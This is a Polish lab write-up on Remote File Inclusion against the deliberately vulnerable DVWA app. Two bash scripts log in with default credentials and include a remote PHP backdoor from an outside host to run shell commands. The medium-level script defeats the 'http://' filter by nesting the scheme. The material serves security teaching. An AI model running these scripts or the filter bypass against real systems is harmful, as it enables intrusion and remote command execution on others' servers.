# RFI - Remote File Inclusion
## Opis techniki
<blockquote>Remote File Inclusion (RFI) to technika ataku, w której atakujący wykorzystuje lukę w aplikacji webowej w celu załadowania przez nią plików z innych serwerów. 
  RFI występuje, gdy aplikacja dynamicznie dołącza pliki zewnętrzne na podstawie danych wejściowych dostarczonych przez użytkownika bez odpowiedniej walidacji i sanityzacji.
  
W ataku RFI atakujący zazwyczaj wstrzykuje adres URL wskazujący na złośliwy skrypt hostowany na zdalnym serwerze do podatnego parametru lub pola wejściowego aplikacji webowej. Gdy aplikacja przetwarza dane wejściowe, pobiera i dołącza określony zdalny plik, wykonując dowolny zawarty w nim kod.

  Konsekwencje udanego ataku RFI mogą obejmować:
  
* Wykonanie kodu: Atakujący może wykonać dowolny kod hostowany na zdalnym serwerze w kontekście podatnej aplikacji. Może to prowadzić do całkowitej kompromitacji systemu docelowego, nieautoryzowanego dostępu lub możliwości wykonywania złośliwych działań.
* Kradzież danych: Atakujący może wykorzystać RFI do uzyskania dostępu do poufnych danych, takich jak pliki konfiguracyjne, poświadczenia bazy danych lub inne poufne informacje przechowywane na serwerze docelowym.
* Instalacja backdoora: Dołączając zdalny skrypt, atakujący może utworzyć backdoora lub mechanizm zdalnego sterowania, umożliwiając mu utrzymanie stałego dostępu do zaatakowanego systemu i potencjalne dalsze wykorzystywanie go.</blockquote>

## DVWA labs

- [DVWA RFI #1 - Low](#dvwa-rfi-1---low)

- [DVWA RFI #2 - Medium](#dvwa-rfi-2---medium)

<br/>

## DVWA RFI #1 - Low
Na niskim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Brak filtrowania


#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | PHP backdoor uri | uri | http://10.22.11.10:2541/rfi.php|
| 3 | nazwa parametru GET używana przez backdoor | string | cmd|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <backdoor uri> <param name>"
  echo "Description: This script attempts to create a simple shell access using dvwa's rfi [low] vulnerability."
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <backdoor uri>  URI to the php file used to gain shell access"
  echo "  <param name>    GET parameter name used to send commands to the php backdoor"
}

# Check if the required number of arguments are provided
if [[ $# -ne 3 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=low&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/low/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

send_cmd() {
  encoded=$(jq -nr --arg v "$input" '$v|@uri')
  curl -s -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/vulnerabilities/fi/?page=$2&$3=$encoded"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 || -z $3 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"

while true; do
    read -p "\$ " input
    [[ $input == "exit" ]] && break
    send_cmd "$1" "$2" "$3" "$input"
done
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/rfi_low.gif "Po uruchomieniu skrypt eksploituje RFI i tworzy interfejs do obsługi uruchomionego webshella")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA RFI #2 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie polegające na wycinaniu `../`, `.."` oraz `http://` i `https://`


#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | PHP backdoor uri | uri | http://10.22.11.10:2541/rfi.php|
| 3 | nazwa parametru GET używana przez backdoor | string | cmd|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <backdoor uri> <param name>"
  echo "Description: This script attempts to create a simple shell access using dvwa's rfi [medium] vulnerability."
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <backdoor uri>  URI to the php file used to gain shell access"
  echo "  <param name>    GET parameter name used to send commands to the php backdoor"
}

# Check if the required number of arguments are provided
if [[ $# -ne 3 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=medium&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/medium/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

send_cmd() {
  encoded=$(jq -nr --arg v "$input" '$v|@uri')
  curl -s -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/vulnerabilities/fi/?page=$modified_url&$3=$encoded"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 || -z $3 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"

url="$2"
modified_url=${url/#http:\/\//hthttp:\/\/tp:\/\/}
modified_url=${modified_url/#https:\/\//hthttp:\/\/tps:\/\/}

while true; do
    read -p "\$ " input
    [[ $input == "exit" ]] && break
    send_cmd "$1" "$modified_url" "$3" "$input"
done
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/rfi_medium.gif "Po uruchomieniu skrypt eksploituje RFI i tworzy interfejs do obsługi uruchomionego webshella")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```

<br/>
